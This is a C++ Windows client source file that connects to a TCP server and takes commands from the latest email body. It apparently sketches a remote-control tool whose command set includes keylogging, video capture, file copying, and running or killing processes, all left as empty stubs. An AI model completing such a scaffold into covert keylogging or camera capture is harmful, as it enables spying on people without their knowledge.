#include "client.h"
#include "sstream"

void Client::Init(std::string hostIP, std::string port)
{
    if (hostIP.empty())
        serverHost = "localhost";
    else
        serverHost = hostIP;
    if (port.empty())
    {
        port = PORT;
    }
    else
        port = PORT;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed\n";
        exit(1);
    }
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    int rc = getaddrinfo(serverHost.c_str(), port.c_str(), &hints, &res);
    if (rc != 0)
    {
        std::cerr << "Get address info failed (" << rc << ")\n";
        WSACleanup();
        exit(1);
    }

    connSock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (connSock == INVALID_SOCKET)
    {
        std::cerr << "Create socket failed\n";
        freeaddrinfo(res);
        WSACleanup();
        exit(1);
    }

    if (connect(connSock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR)
    {
        std::cerr << "Unable to connect to server\n";
        closesocket(connSock);
        freeaddrinfo(res);
        WSACleanup();
        exit(1);
    }
}

void Client::GetCommand()
{
    if (!gmail.GetLatestEmailBody(command))
    {
        // Enter Command
    }
}

void Client::ProcessCommand()
{
    std::stringstream ss(command);
    std::string com, body;
    ss >> com >> body;
    if (com == "COPYFILE")
    {
        // Handle COPYFILE
    }
    else if (com == "TOGGLE_VIDEO")
    {
        // Handle TOGGLE_VIDEO
    }
    else if (com == "GET_VIDEO")
    {
        // Handle GET_VIDEO
    }
    else if (com == "TOGGLE_KEYLOGGER")
    {
        // Handle TOGGLE_KEYLOGGER
    }
    else if (com == "GET_KEYLOGGER")
    {
        // Handle GET_KEYLOGGER
    }
    else if (com == "GET_RUNNING_PROCESSS")
    {
        // Handle GET_RUNNING_PROCESSS
    }
    else if (com == "RUN_PROCESS")
    {
        // Handle RUN_PROCESS
    }
    else if (com == "SHUTDOWN_PROCESS")
    {
        // Handle SHUTDOWN_PROCESS
    }
    else if (com == "SLEEP")
    {
        // Handle SLEEP
    }
    else if (com == "RESTART")
    {
        // Handle RESTART
    }
    else if (com == "SHUTDOWN")
    {
        // Handle SHUTDOWN
    }
}

void Client::Shutdown()
{
    shutdown(connSock, SD_BOTH);
    closesocket(connSock);
}
